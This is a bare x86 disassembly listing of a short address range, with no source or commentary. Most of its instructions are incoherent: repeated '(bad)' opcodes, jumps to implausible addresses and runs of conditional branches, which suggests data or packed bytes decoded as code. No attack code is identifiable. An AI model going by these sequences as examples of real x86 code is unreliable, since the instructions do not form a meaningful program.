  40c59a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c59b:	mov    ds:0xa6527eae,al
  40c5a0:	(bad)  
  40c5a1:	outs   dx,DWORD PTR ds:[esi]
  40c5a2:	pop    eax
  40c5a3:	lea    ecx,[ebp-0x72727679]
  40c5a9:	(bad)  
  40c5aa:	push   ds
  40c5ab:	or     eax,0x36228b8d
  40c5b0:	aad    0xab
  40c5b2:	cli    
  40c5b3:	sbb    eax,0x6f6a2133
  40c5b8:	sahf   
  40c5b9:	bnd jmp 0x762a91ba
  40c5bf:	not    BYTE PTR [esi-0x65f699d8]
  40c5c5:	jp     0x40c552
  40c5c7:	mov    ecx,DWORD PTR [ebx-0x50af6005]
  40c5cd:	sbb    al,dh
  40c5cf:	lahf   
  40c5d0:	leave  
  40c5d1:	shl    BYTE PTR [ebx-0x26d7fab0],cl
  40c5d7:	push   0xffffff86
  40c5d9:	pushf  
  40c5da:	(bad)  
  40c5db:	aad    0x67
  40c5dd:	push   es
  40c5de:	sbb    eax,0x125ea99b
  40c5e3:	lds    edi,FWORD PTR [esi+edi*4]
  40c5e6:	mov    ecx,DWORD PTR [ebx-0x74d929db]
  40c5ec:	mov    ebp,DWORD PTR [edi+0x65]
  40c5ef:	ins    DWORD PTR es:[edi],dx
  40c5f0:	dec    ebp
  40c5f1:	outs   dx,DWORD PTR ds:[esi]
  40c5f2:	outs   dx,BYTE PTR ds:[esi]
  40c5f3:	inc    ebx
  40c5f4:	jae    0x40c634
  40c5f6:	inc    esp
  40c5f7:	jae    0x40c662
  40c5f9:	je     0x40c660
  40c5fb:	imul   esp,DWORD PTR [ebx+0x73],0x65702070
  40c602:	jo     0x40c673
  40c604:	sub    BYTE PTR [eax+0x2e],dh
  40c607:	gs jns 0x40c681
  40c60a:	jbe    0x40c673
  40c60c:	imul   esi,DWORD PTR [edx+0xd],0x6d437972
  40c613:	imul   eax,DWORD PTR [ebp+eiz*2+0x54],0x2022724d
  40c61b:	dec    esp
  40c61c:	jb     0x40c691
  40c61e:	jae    0x40c683
  40c620:	imul   ebp,DWORD PTR [ebp+0x65],0x73697272
  40c627:	jae    0x40c696
  40c629:	and    BYTE PTR [esi+eiz*2+0x6c],al
  40c62d:	imul   esi,DWORD PTR [eax+0x76],0x786f2069
  40c634:	or     eax,0x72635741
  40c639:	jae    0x40c5c6
  40c63b:	jne    0x40c6b2
  40c63d:	jne    0x40c6b4
  40c63f:	jne    0x40c6b6
  40c641:	jne    0x40c6b8
  40c643:	jne    0x40c691
  40c645:	loope  0x40c61f
  40c647:	jne    0x40c6be
  40c649:	jne    0x40c6c0
  40c64b:	jne    0x40c6c2
  40c64d:	jne    0x40c6c4
  40c64f:	jne    0x40c5dc
  40c651:	mov    esi,DWORD PTR [eax-0x77e33df0]
  40c657:	cmp    ebx,DWORD PTR [edx-0x34]
  40c65a:	jmp    0xad8e:0xcd326c21
  40c661:	mov    bl,0x89
  40c663:	(bad)  
  40c664:	fwait
  40c665:	or     esp,DWORD PTR [ebp-0x740062ff]
  40c66b:	mov    ecx,DWORD PTR [ebp-0x327474b2]
  40c671:	sbb    al,0x8b
  40c673:	mov    ebp,DWORD PTR [eax]
  40c675:	push   0xe8aeb9f6
  40c67a:	hlt    
  40c67b:	mov    al,0xe1
  40c67d:	mov    ?,WORD PTR [ebx-0x4da99ea5]
  40c683:	pop    DWORD PTR [edi-0x13de4ac2]
  40c689:	lds    esp,FWORD PTR [esp+ebp*2-0x75]
  40c68d:	or     BYTE PTR [edi+0x86e2a94],dh
  40c693:	or     BYTE PTR [eax],cl
  40c695:	ret    
  40c696:	adc    eax,0xe2447419
  40c69b:	mov    esp,0x78215b45
  40c6a0:	popa   
  40c6a1:	push   esp
  40c6a2:	add    eax,0xf6a90eba
  40c6a7:	mov    ecx,0xf68df0d1
  40c6ac:	imul   edx,DWORD PTR [ebx+0x25c92ea4],0xffffff8b
  40c6b3:	jle    0x40c71c
  40c6b5:	cwde   
  40c6b6:	mov    ebx,0xc508081a
  40c6bb:	fmul   DWORD PTR [eax]
  40c6bd:	or     BYTE PTR [eax],cl
  40c6bf:	xor    esi,DWORD PTR [ebx]
  40c6c1:	xor    esi,DWORD PTR [ebx]
  40c6c3:	xor    esi,DWORD PTR [ebx]
  40c6c5:	xor    esi,DWORD PTR [ebx]
  40c6c7:	xor    edx,DWORD PTR [edi]
  40c6c9:	retf   0x75e1
  40c6cc:	jne    0x40c743
  40c6ce:	jne    0x40c745
  40c6d0:	jne    0x40c747
  40c6d2:	jne    0x40c749
  40c6d4:	add    BYTE PTR [eax],al
  40c6d6:	mov    dh,dh
  40c6d8:	lahf   
  40c6d9:	pop    ecx
  40c6da:	stos   DWORD PTR es:[edi],eax
  40c6db:	rcl    BYTE PTR [ebx-0x57],cl
  40c6de:	cmp    BYTE PTR [edi+0x5f],al
  40c6e1:	or     eax,0xc81560b7
  40c6e6:	inc    di
  40c6e8:	into   
  40c6e9:	dec    eax
  40c6ea:	mov    ds:0x17f72d,al
  40c6ef:	add    BYTE PTR [eax-0x67f117d4],bl
  40c6f5:	bound  eax,QWORD PTR [edx]
  40c6f7:	mov    bh,0x8a
  40c6f9:	sbb    eax,0x1082c616
  40c6fe:	push   esi
  40c6ff:	lods   eax,DWORD PTR ds:[esi]
  40c700:	push   cs
  40c701:	int    0x8d
  40c703:	mov    bh,BYTE PTR [edx-0x28]
  40c706:	jbe    0x40c6b0
  40c708:	jg     0x40c691
  40c70a:	xchg   ebx,eax
  40c70b:	repz lds eax,FWORD PTR [eax]
  40c70e:	add    BYTE PTR [eax+ebx*4],bl
  40c711:	add    BYTE PTR ds:[eax],al
  40c714:	les    ebx,FWORD PTR [edx+0x6d8d006d]
  40c71a:	fwait
  40c71b:	rcl    BYTE PTR [eax+ecx*1],1
  40c71e:	and    BYTE PTR [ebx+0x3f],al
  40c721:	dec    edi
  40c722:	add    eax,0xf89fff7
  40c727:	and    al,0xf0
  40c729:	ins    BYTE PTR es:[edi],dx
  40c72a:	pop    edi
  40c72b:	xor    eax,0x459b7af1
  40c730:	adc    DWORD PTR [ebp+0x266a8d8d],ecx
  40c736:	lea    ecx,[ebp-0x7272cf46]
  40c73c:	lea    esi,[ebp+0x75]
  40c73f:	jne    0x40c7b6
  40c741:	jne    0x40c7b8
  40c743:	jne    0x40c7ba
  40c745:	jne    0x40c76e
  40c747:	ins    DWORD PTR es:[edi],dx
  40c748:	push   ecx
  40c749:	dec    edi
  40c74a:	lea    esp,[edi+edi*8-0x6b]
  40c74e:	mov    al,0x8c
  40c750:	xchg   edx,eax
  40c751:	jns    0x40c7ba
  40c753:	not    BYTE PTR [ebp-0x61f511ad]
  40c759:	jmp    0x403e9940
	...
  40c766:	add    BYTE PTR [eax],al
  40c768:	add    BYTE PTR [ecx],dl
  40c76a:	adc    BYTE PTR [ebx+edx*1-0xf250000],bl
  40c771:	jnp    0x40c733
  40c773:	dec    edx
  40c774:	add    eax,0x4d6a697c
  40c779:	rol    BYTE PTR [ebp+0x2],0xa3
  40c77d:	add    eax,edx
  40c77f:	inc    edx
  40c780:	ds push eax
  40c782:	jne    0x40c791
  40c784:	ds jns 0x40c77c
  40c787:	repz mov WORD PTR [ebp-0x22],?
  40c78b:	lea    eax,[edi]
  40c78d:	mov    al,ds:0x805145af
  40c792:	add    BYTE PTR [eax],al
  40c794:	adc    edx,DWORD PTR ds:0xa3340000
  40c79a:	xchg   ebx,eax
  40c79b:	add    BYTE PTR [ebp-0x463e9792],cl
  40c7a1:	and    BYTE PTR [ebp-0x46],bh
  40c7a4:	xchg   esi,eax
  40c7a5:	addr16 lock jno 0x40c754
  40c7a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7aa:	popf   
  40c7ab:	dec    edx
  40c7ac:	fucomp st(7)
  40c7ae:	jecxz  0x40c7a5
  40c7b0:	cmc    
  40c7b1:	push   edx
  40c7b2:	(bad)
  40c7b5:	lea    ecx,[ebp+0x2da2f88d]
  40c7bb:	adc    ebx,DWORD PTR [edx-0x76]
  40c7be:	push   eax
  40c7bf:	je     0x40c7da
  40c7c1:	daa    
  40c7c2:	xor    al,0x37
  40c7c4:	xchg   BYTE PTR [si-0x3a7c],bh
  40c7c9:	in     eax,dx
  40c7ca:	inc    eax
  40c7cb:	jl     0x40c7f3
  40c7cd:	mov    gs,WORD PTR [ebp+0x1a9a848b]
  40c7d3:	jmp    0x40c834
  40c7d5:	lea    ecx,[ebp-0x722368c5]
  40c7db:	lea    ecx,[ebp+0x0]
  40c7e1:	add    BYTE PTR [eax],al
  40c7e3:	add    BYTE PTR [eax],al
  40c7e5:	add    BYTE PTR [edi-0xdd1f],al
  40c7eb:	(bad)  
  40c7ec:	(bad)  
  40c7ed:	(bad)  
  40c7ee:	(bad)  
  40c7ef:	(bad)  
  40c7f0:	(bad)  
  40c7f1:	inc    DWORD PTR [eax]
  40c7f3:	add    BYTE PTR [ebp+0x2564a037],cl
  40c7f9:	xchg   esp,eax
  40c7fa:	inc    esp
  40c7fb:	jbe    0x40c795
  40c7fd:	std    
  40c7fe:	es jae 0x40c7f2
  40c801:	data16 mov al,0xe3
  40c804:	adc    eax,0xff53205b
  40c809:	enter  0x9d05,0x0
  40c80d:	add    BYTE PTR [edi-0x65],ch
  40c810:	add    BYTE PTR [eax],al
  40c812:	jl     0x40c847
  40c814:	add    BYTE PTR [eax],al
  40c816:	rcl    DWORD PTR ds:0x7bc02f8,0x1d
  40c81d:	out    dx,eax
  40c81e:	into   
  40c81f:	retf   0x17dd
  40c822:	mov    bl,0x52
  40c824:	gs pop edi
  40c826:	(bad)  
  40c827:	sub    BYTE PTR [esi],dh
  40c829:	cld    
  40c82a:	mov    dl,0x47
  40c82c:	pop    ds
  40c82d:	enter  0x8d00,0x46
  40c831:	ror    DWORD PTR [ebx-0x44],0x8d
  40c835:	lea    ecx,[ebp-0x51b3dbd9]
  40c83b:	fsub   st(0),st
  40c83d:	cmp    DWORD PTR [ecx],esp
  40c83f:	lahf   
  40c840:	dec    esi
  40c841:	and    BYTE PTR [esi+ebx*8+0x192ad9be],bh
  40c848:	cmp    ah,ah
  40c84a:	and    bl,cl
  40c84c:	jno    0x40c889
  40c84e:	push   esp
  40c84f:	pushf  
  40c850:	inc    ebx
  40c851:	xor    al,BYTE PTR [edx]
  40c853:	mov    cs,WORD PTR [ebp+0x4068994c]
  40c859:	fisttp DWORD PTR [ebp-0x72795b73]
  40c85f:	lea    ecx,[ebp-0x1]
  40c865:	(bad)  
  40c866:	(bad)  
  40c867:	(bad)  
  40c868:	(bad)  
  40c869:	call   DWORD PTR [ebp+0x2c]
  40c86c:	scas   eax,DWORD PTR es:[edi]
  40c86d:	(bad)  
  40c86e:	(bad)  
  40c86f:	(bad)  
  40c870:	(bad)  
  40c871:	(bad)  
  40c872:	(bad)  
  40c873:	(bad)  
  40c874:	(bad)  
  40c875:	(bad)  
  40c876:	push   DWORD PTR [esi+0x6f]
  40c879:	outs   dx,BYTE PTR ds:[esi]
  40c87a:	bound  ebp,QWORD PTR [ebp+0x22]
  40c87d:	inc    ecx
  40c87e:	and    BYTE PTR gs:[ebx+0x20],dh
  40c882:	je     0x40c8a4
  40c884:	das    
  40c885:	imul   esp,DWORD PTR gs:[edx],0x7265536f
  40c88c:	push   0x6d6c3e66
  40c891:	jb     0x40c8b3
  40c893:	outs   dx,DWORD PTR ds:[esi]
  40c894:	cmp    al,0x3a
  40c896:	gs je  0x40c8d5
  40c899:	popa   
  40c89a:	push   edi
  40c89b:	jne    0x40c910
  40c89d:	jae    0x40c904
  40c89f:	jbe    0x40c8de
  40c8a1:	arpl   WORD PTR [edi+0x76],sp
  40c8a4:	inc    esp
  40c8a5:	jae    0x40c91a
  40c8a7:	inc    ebx
  40c8a8:	push   edi
  40c8a9:	and    cl,BYTE PTR cs:0x653d2065
  40c8b0:	outs   dx,DWORD PTR ds:[esi]
  40c8b1:	gs popa 
  40c8b3:	cs js  0x40c924
  40c8b6:	or     ch,BYTE PTR [esi]
  40c8b8:	outs   dx,DWORD PTR ds:[esi]
  40c8b9:	sub    BYTE PTR gs:[ebp+0x70],ah
  40c8bd:	gs ins DWORD PTR es:[edi],dx
  40c8bf:	sub    BYTE PTR [ecx+0x65],ch
  40c8c2:	outs   dx,DWORD PTR ds:[esi]
  40c8c3:	push   ebx
  40c8c4:	ins    DWORD PTR es:[edi],dx
  40c8c5:	bound  edx,QWORD PTR gs:[edx+0x79]
  40c8c9:	imul   ebp,DWORD PTR [ecx+0x73],0x7267690a
  40c8d0:	cs data16 jo 0x40c947
  40c8d4:	arpl   WORD PTR [edx+eiz*1+0x63],sp
  40c8d8:	arpl   WORD PTR [ebp+0x65],bp
  40c8db:	imul   esp,DWORD PTR [ebp+0x72],0x6344726d
  40c8e2:	addr16 ds gs jae 0x40c94c
  40c8e7:	gs popa 
  40c8e9:	imul   eax,DWORD PTR [eax+eiz*1+0x57],0x656e6d6d
  40c8f1:	popa   
  40c8f2:	dec    ebp
  40c8f3:	jo     0x40c957
  40c8f5:	imul   esi,DWORD PTR [edi+0x73],0x59ff6e63
  40c8fc:	xlat   BYTE PTR ds:[ebx]
  40c8fd:	arpl   WORD PTR [edx-0x1a],cx
  40c900:	push   edi
  40c901:	sub    dl,al
  40c903:	lea    ecx,[ebp-0xcba5b14]
  40c909:	xchg   ecx,eax
  40c90a:	push   0xdb454991
  40c90f:	mov    al,ds:0xff7ed249
  40c914:	call   DWORD PTR [ecx-0x37]
  40c917:	in     al,0x14
  40c919:	nop
  40c91a:	inc    ebx
  40c91b:	add    eax,0xefc79d3b
  40c920:	bound  esi,QWORD PTR ds:0xca1c354e
  40c926:	int    0x29
  40c928:	fnstcw WORD PTR [esi]
  40c92a:	stos   DWORD PTR es:[edi],eax
  40c92b:	sbb    ecx,edi
  40c92d:	test   eax,0xe27dc506
  40c932:	(bad)  
  40c933:	inc    eax
  40c935:	mov    dh,0x6e
  40c937:	(bad)  
  40c938:	dec    ecx
  40c93a:	push   ebx
  40c93b:	jge    0x40c93c
  40c93d:	mov    ebp,eax
  40c93f:	or     eax,0xd89af0d7
  40c944:	addr16 popa 
  40c946:	sti    
  40c947:	jnp    0x40c9a7
  40c949:	sub    BYTE PTR [edi+0x38],bh
  40c94c:	pop    es
  40c94d:	lock xchg esp,eax
  40c94f:	inc    ebx
  40c950:	inc    esp
  40c951:	add    ecx,edx
  40c953:	sub    al,0xde
  40c955:	out    0x8b,eax
  40c957:	mov    ecx,DWORD PTR [ebx-0x74748bf6]
  40c95d:	fs dec eax
  40c95f:	mov    ecx,DWORD PTR [ebx+0x8b]
  40c965:	add    BYTE PTR [eax],al
  40c967:	add    BYTE PTR [eax],al
  40c969:	add    BYTE PTR [eax],al
  40c96b:	pushf  
  40c96c:	push   ds
  40c96d:	cmp    DWORD PTR [ebx+0x24],edi
  40c970:	mov    esi,cs
  40c972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c973:	mov    ds:0xb3b7ac4f,eax
  40c978:	les    ebp,FWORD PTR [eax-0x20]
  40c97b:	xchg   ecx,eax
  40c97c:	jge    0x40c9cb
  40c97e:	jle    0x40c91d
  40c980:	mov    bh,0x6c
  40c982:	and    BYTE PTR [eax],al
	...
  40c98c:	mov    ecx,DWORD PTR [ebx-0x100f5d55]
  40c992:	mov    ecx,DWORD PTR [ebx+0x7780aac5]
  40c998:	xor    edx,edx
  40c99a:	pushf  
  40c99b:	repz or al,0xc5
  40c99e:	adc    DWORD PTR [edi+0x64e2553b],esi
  40c9a4:	adc    esp,DWORD PTR [eax+0x2e0af597]
  40c9aa:	push   cs
  40c9ab:	(bad)  
  40c9ad:	dec    ebx
  40c9ae:	(bad)  
  40c9af:	rol    BYTE PTR [eax-0x42],1
  40c9b2:	lods   al,BYTE PTR ds:[esi]
  40c9b3:	fwait
  40c9b4:	cmp    DWORD PTR [esi+0x18],0x88478b8b
  40c9bb:	mov    ecx,DWORD PTR [ebx-0x74cc18be]
  40c9c1:	add    BYTE PTR [edi],dl
  40c9c3:	lods   eax,DWORD PTR ds:[esi]
  40c9c4:	push   ecx
  40c9c5:	faddp  st(4),st
  40c9c7:	cmp    al,0x42
  40c9c9:	dec    esp
  40c9ca:	test   BYTE PTR [ecx],cl
  40c9cc:	dec    ebx
  40c9cd:	jne    0x40c993
  40c9cf:	mov    esi,0x9c9f25f4
  40c9d4:	xchg   ebx,eax
  40c9d5:	sti    
  40c9d6:	mov    ah,0x92
  40c9d8:	add    eax,0x9c
  40c9dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9de:	bound  esi,QWORD PTR [ecx-0x6b5748f5]
  40c9e4:	cmc    
  40c9e5:	jo     0x40ca33
  40c9e7:	mov    esp,0x372bb195
  40c9ec:	cmc    
  40c9ed:	mov    ah,0xab
  40c9ef:	dec    edi
  40c9f0:	push   eax
  40c9f1:	xchg   ebx,eax
  40c9f2:	lods   al,BYTE PTR ds:[esi]
  40c9f3:	add    edx,DWORD PTR [ebx-0x6c]
  40c9f6:	test   eax,0x34d113
  40c9fb:	add    BYTE PTR [esi+0x9bd8],ch
  40ca01:	add    al,ch
  40ca03:	call   0xe929b2f0
  40ca08:	call   0x317eb2f5
  40ca0d:	sub    eax,DWORD PTR [eax]
	...
  40ca17:	add    BYTE PTR [eax],al
  40ca19:	fdiv   st,st(6)
  40ca1b:	xchg   ebp,eax
  40ca1c:	ja     0x40c9af
  40ca1e:	mov    ebx,0xe8587ce5
  40ca23:	aas    
  40ca24:	jno    0x40ca64
  40ca26:	mov    ebx,0xb13be9e8
  40ca2b:	sbb    eax,0xa607c725
  40ca30:	out    0x0,al
  40ca32:	add    cl,al
  40ca34:	jecxz  0x40ca36
  40ca36:	add    BYTE PTR [ebp+0x20000004],cl
  40ca3c:	mov    esi,0x542b8876
  40ca41:	addr16 in al,0x36
  40ca44:	push   0xc4ec2814
  40ca49:	clc    
  40ca4a:	dec    ecx
  40ca4b:	mov    ebx,0xa09828ae
  40ca50:	loop   0x40ca78
  40ca52:	nop
  40ca53:	add    BYTE PTR [ecx+0x66f1634b],cl
  40ca59:	mov    DWORD PTR [ecx+0x75d6f589],ecx
  40ca5f:	pop    esi
  40ca60:	mov    DWORD PTR [bx+0x68],ecx
  40ca64:	sub    esi,DWORD PTR [edx]
  40ca66:	pushf  
  40ca67:	cli    
  40ca68:	cmp    ch,BYTE PTR [edx]
  40ca6a:	das    
  40ca6b:	adc    al,0x7a
  40ca6d:	pop    esi
  40ca6e:	addr16 iret 
  40ca70:	test   BYTE PTR [eax],ah
  40ca72:	dec    ebp
  40ca73:	jmp    0x7ea3:0xe2bd46ed
  40ca7a:	adc    BYTE PTR [eax],ah
  40ca7c:	or     dl,BYTE PTR [esi+0x28]
  40ca7f:	mov    DWORD PTR [ecx-0x767676d8],ecx
  40ca85:	mov    DWORD PTR [eax],eax
	...
  40ca8f:	inc    eax
  40ca90:	inc    esp
  40ca91:	add    eax,DWORD PTR [eax]
	...
  40ca9b:	int3   
  40ca9c:	int3   
  40ca9d:	in     al,0xc7
  40ca9f:	sub    dh,al
  40caa1:	lahf   
  40caa2:	aaa    
  40caa3:	mov    ah,0xcf
  40caa5:	jg     0x40cacb
  40caa7:	cld    
  40caa8:	inc    esp
  40caa9:	arpl   WORD PTR [ecx-0x469eaf2c],cx
  40caaf:	mov    bl,0xcc
  40cab1:	(bad)  [edx+eax*4]
  40cab4:	inc    edi
  40cab5:	int3   
  40cab6:	int3   
  40cab7:	push   esp
  40cab8:	lahf   
  40cab9:	jne    0x40cb15
  40cabb:	out    0xa6,eax
  40cabd:	iret   
  40cabe:	jne    0x40cac1
  40cac0:	xlat   BYTE PTR ds:[ebx]
  40cac1:	mov    dl,BYTE PTR [ebx]
  40cac3:	(bad)  
  40cac5:	(bad)  
  40cac6:	push   cs
  40cac7:	(bad)  
  40cac8:	dec    ebp
  40cac9:	mov    edx,DWORD PTR [edi]
  40cacb:	push   0xf2b18263
  40cad0:	repz mov ds:0xcccc713c,al
  40cad6:	ror    DWORD PTR [edx+ecx*2+0x5b87cccc],0x84
  40cade:	int3   
  40cadf:	add    dl,dh
  40cae1:	jne    0x40ca67
  40cae3:	data16 hlt 
  40cae5:	add    dh,ch
  40cae7:	mov    esp,0x297825de
  40caec:	xchg   esi,esp
  40caee:	fimul  DWORD PTR [ebx+0x1b]
  40caf1:	mov    ds:0x34b7fdec,al
  40caf6:	scas   eax,DWORD PTR es:[edi]
  40caf7:	ret    0x0
  40cafa:	add    BYTE PTR [edi],dh
  40cafc:	pop    edi
  40cafd:	add    BYTE PTR [eax],al
  40caff:	cmp    BYTE PTR [edi+0x0],0x0
  40cb06:	add    BYTE PTR [eax],al
  40cb08:	add    BYTE PTR [eax],al
  40cb0a:	add    BYTE PTR [eax],al
  40cb0c:	add    dh,ch
  40cb0e:	out    dx,al
  40cb0f:	lahf   
  40cb10:	scas   al,BYTE PTR es:[edi]
  40cb11:	mov    esi,0xc3671974
  40cb16:	sti    
  40cb17:	(bad)  
  40cb18:	jbe    0x40cb71
  40cb1a:	dec    esp
  40cb1b:	in     al,dx
  40cb1c:	push   ss
  40cb1d:	adc    BYTE PTR [ebx*4-0x16a92a36],bl
  40cb24:	test   al,0xff
  40cb26:	(bad)  
  40cb27:	(bad)  
  40cb28:	(bad)  
  40cb29:	(bad)  
  40cb2a:	(bad)  
  40cb2b:	(bad)  
  40cb2c:	(bad)  
  40cb2d:	(bad)  
  40cb2e:	(bad)  
  40cb2f:	jmp    DWORD PTR [esi-0x3b]
  40cb32:	mov    DWORD PTR [ecx],esp
  40cb34:	(bad)  
  40cb35:	(bad)  
  40cb36:	jg     0x40cac5
  40cb38:	mov    dl,0xd5
  40cb3a:	dec    ecx
  40cb3b:	adc    esp,ecx
  40cb3d:	cs jno 0x40cba4
  40cb40:	push   ss
  40cb41:	idiv   ebx
  40cb43:	ja     0x40cb1f
  40cb45:	adc    al,0xe6
  40cb47:	and    ecx,DWORD PTR [ecx+eiz*1]
  40cb4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb4c:	xor    ebp,DWORD PTR [eax-0x6dd49d57]
  40cb52:	or     ebx,eax
  40cb54:	mov    eax,0x7ebcba97
  40cb59:	(bad)  
  40cb5a:	jmp    FWORD PTR [esi]
  40cb5c:	xchg   bh,bh
  40cb5e:	jmp    DWORD PTR ds:0x6affd9da
  40cb64:	pop    es
  40cb65:	ret    0xf708
  40cb68:	retf   
  40cb69:	push   ecx
  40cb6a:	mov    ah,BYTE PTR ds:0xa484c268
  40cb70:	sub    BYTE PTR [edi+0x6564f997],ch
  40cb76:	mov    dl,bl
  40cb78:	inc    ecx
  40cb79:	cwde   
  40cb7a:	aas    
  40cb7b:	jbe    0x40cbe7
  40cb7d:	push   0x6a
  40cb7f:	inc    ebp
  40cb80:	outs   dx,BYTE PTR ds:[esi]
  40cb81:	pushf  
  40cb82:	dec    edx
  40cb83:	retf   
  40cb84:	fs dec esp
  40cb86:	add    ebx,DWORD PTR [ebp+0x404e3895]
  40cb8c:	mov    eax,ds:0xf02a6add
  40cb91:	xor    DWORD PTR [esi],ebp
  40cb93:	adc    eax,0x32fdf182
  40cb98:	inc    esp
  40cb99:	mov    edx,0x6a6a1456
  40cb9e:	pop    ebx
  40cb9f:	and    ecx,DWORD PTR [edx]
  40cba1:	push   0x6a
  40cba3:	push   0x0
	...
  40cbad:	cmc    
  40cbae:	loopne 0x40cbd5
  40cbb0:	je     0x40cc26
  40cbb2:	je     0x40cc28
  40cbb4:	je     0x40cc2a
  40cbb6:	je     0x40cc2c
  40cbb8:	je     0x40cc0a
  40cbba:	push   eax
  40cbbb:	test   DWORD PTR [ecx-0x6ae77ba6],ebx
  40cbc1:	sub    ecx,0xffffffa1
  40cbc4:	(bad)
  40cbc7:	sar    DWORD PTR ds:0xe623910d,1
  40cbcd:	jecxz  0x40cbcd
  40cbcf:	std    
  40cbd0:	(bad)  
  40cbd1:	xchg   DWORD PTR ds:[eax+0x50],edx
  40cbd5:	aam    0x72
  40cbd7:	push   eax
  40cbd8:	push   eax
  40cbd9:	xor    DWORD PTR [eax+edx*2+0x6eb4f050],esp
  40cbe0:	mov    ecx,0x21e9310d
  40cbe5:	es fwait
  40cbe7:	mov    ds:0xf046f89d,eax
  40cbec:	scas   al,BYTE PTR es:[edi]
  40cbed:	sti    
  40cbee:	xlat   BYTE PTR ds:[ebx]
  40cbef:	add    ecx,ebx
  40cbf1:	jg     0x40cbd1
  40cbf3:	mov    bl,0x6a
  40cbf5:	push   eax
  40cbf6:	int3   
  40cbf7:	inc    edi
  40cbf8:	(bad)  
  40cbf9:	xchg   ecx,eax
  40cbfa:	nop
  40cbfb:	int3   
  40cbfc:	int3   
  40cbfd:	int3   
  40cbfe:	pop    ds
  40cbff:	sar    BYTE PTR [ebp-0x65],1
  40cc02:	adc    eax,0x944e8d00
  40cc07:	sahf   
  40cc08:	lea    ebp,[ebx]
  40cc0a:	push   0xffffff97
  40cc0c:	mov    BYTE PTR ds:[bp-0x3c],dh
  40cc11:	in     al,0x87
  40cc13:	mov    al,ds:0xf1dad14d
  40cc18:	cli    
  40cc19:	(bad)  
  40cc1a:	fisttp WORD PTR [edi+eiz*2]
  40cc1d:	jg     0x40cba4
  40cc1f:	shl    ah,cl
  40cc21:	int3   
  40cc22:	int3   
  40cc23:	add    eax,DWORD PTR [eax-0x333334]
  40cc29:	(bad)  
  40cc2a:	(bad)  
  40cc2b:	(bad)  
  40cc2c:	(bad)  
  40cc2d:	(bad)  
  40cc2e:	(bad)  
  40cc2f:	(bad)  
  40cc30:	call   eax
  40cc32:	fidivr WORD PTR [edx-0x1]
  40cc38:	(bad)  
  40cc39:	(bad)  
  40cc3a:	(bad)  
  40cc3b:	(bad)  
  40cc3c:	jmp    DWORD PTR [esp]
  40cc3f:	xor    bl,BYTE PTR [edx-0x40a00192]
  40cc45:	jl     0x40cc30
  40cc47:	aam    0xe8
  40cc49:	in     al,0x25
  40cc4b:	adc    BYTE PTR [edx-0x73],cl
  40cc4e:	lock jl 0x40cc6e
  40cc51:	push   ss
  40cc52:	add    dh,bl
  40cc54:	mov    esi,0x24240124
  40cc59:	fild   DWORD PTR [edx+0xa]
  40cc5c:	(bad)  
  40cc5d:	mov    BYTE PTR ds:0x176f4842,dl
  40cc63:	pop    edx
  40cc64:	call   0xbf41:0x91c881d4
  40cc6b:	sub    ch,BYTE PTR [esi+0x1e]
  40cc6e:	lahf   
  40cc6f:	daa    
  40cc70:	stos   BYTE PTR es:[edi],al
  40cc71:	xchg   ecx,eax
  40cc72:	retf   0x22c
  40cc75:	add    esp,DWORD PTR [esp]
  40cc78:	popf   
  40cc79:	or     ecx,DWORD PTR [ecx+0x1d502424]
  40cc7f:	xor    BYTE PTR [eax+eax*1],ah
  40cc82:	mov    dh,0x86
  40cc84:	call   0x6590a01
  40cc89:	xlat   BYTE PTR ds:[ebx]
  40cc8a:	push   ecx
  40cc8b:	xor    DWORD PTR [esp+esi*1-0xd2fbaa],edi
  40cc92:	push   ecx
  40cc93:	jmp    0xdaa500d0
  40cc98:	(bad)  
  40cc99:	leave  
  40cc9a:	add    BYTE PTR [eax],al
  40cc9c:	add    BYTE PTR ds:0x6200003e,dh
  40cca2:	ret    0x0
  40cca5:	add    BYTE PTR [ebx-0x74747475],cl
  40ccab:	mov    ecx,DWORD PTR [ebx+0x3eef8b8b]
  40ccb1:	gs add edi,ebx
  40ccb4:	cmp    DWORD PTR [eax-0x6d],esp
  40ccb7:	push   eax
  40ccb8:	cwde   
  40ccb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccba:	adc    eax,0xed8e818e
  40ccbf:	das    
  40ccc0:	mov    WORD PTR [esi-0x4c02ddeb],gs
  40ccc6:	in     eax,dx
	...
  40cccf:	add    BYTE PTR [ebx+0x6372438b],cl
  40ccd5:	dec    ebp
  40ccd6:	jo     0x40cd41
  40ccd8:	ds data16 jb 0x40cd4a
  40ccdc:	and    BYTE PTR [esi+0x73],ah
  40ccdf:	cmp    eax,0x222e6f20
  40cce4:	and    BYTE PTR [ebp+0x79],ah
  40cce7:	cmp    ch,BYTE PTR [ebp+0x76]
  40ccea:	bound  esi,QWORD PTR [esi+0x2e]
  40cced:	cmp    eax,0x6d69736e
  40ccf2:	ins    DWORD PTR es:[edi],dx
  40ccf3:	outs   dx,DWORD PTR ds:[esi]
  40ccf4:	dec    ebp
  40ccf5:	cs data16 jo 0x40cd6b
  40ccf9:	je     0x40cd1d
  40ccfb:	dec    bp
  40ccfd:	dec    ebp
  40ccfe:	push   ebx
  40ccff:	dec    ebp
  40cd00:	push   edx
  40cd01:	and    BYTE PTR [ebp+0x73],ah
  40cd04:	cmp    al,0x63
  40cd06:	cmp    al,0x73
  40cd08:	and    ah,BYTE PTR [ebp+0x6f]
  40cd0b:	das    
  40cd0c:	bound  esp,QWORD PTR [edx]
  40cd0e:	gs je  0x40cd80
  40cd11:	jne    0x40cd35
  40cd13:	bound  esp,QWORD PTR [ecx+ebp*2+0x63]
  40cd17:	arpl   WORD PTR cs:[ebp+0x62],sp
  40cd1b:	push   ebx
  40cd1c:	ins    DWORD PTR es:[edi],dx
  40cd1d:	and    BYTE PTR [edi+0x65],ch
  40cd20:	and    BYTE PTR [edx],cl
  40cd22:	jbe    0x40cd8d
  40cd24:	je     0x40cd54
  40cd26:	imul   esp,DWORD PTR [edx+0x53],0x65657062
  40cd2d:	outs   dx,BYTE PTR ds:[esi]
  40cd2e:	ins    DWORD PTR es:[edi],dx
  40cd2f:	ja     0x40cd59
  40cd31:	je     0x40cd53
